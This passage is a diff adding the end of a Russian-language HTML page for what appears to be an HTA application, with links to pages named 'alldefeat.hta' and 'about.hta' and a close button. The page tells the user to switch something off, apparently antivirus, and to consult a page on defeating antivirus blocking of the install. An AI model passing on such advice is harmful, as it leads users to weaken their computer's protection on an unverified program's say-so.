+    вашего компьютера, отключите его и ознакомьтесь с материалами <a href=
+    "alldefeat.hta"
+       title="Страница исправления блокировки установки антивирусом">на странице:
+       <code>alldefeat.hta</code></a>.</p>
+
+    <p>Общую и юридическую информацию о программе вы можете найти <a href="about.hta"
+       title="Страница с информацией о приложении">на странице:
+       <code>about.hta</code></a></p>
+
+    <p>После выполнения всех действий можете закрыть веб-приложение.</p>
+
+    <p><input align="middle"
+           class="c-button"
+           id="buttonclose"
+           name="button close"
+           type="button"
+           onclick="buttonclose()"
+           value="Закрыть страницу" /></p>
+</body>
+</html>
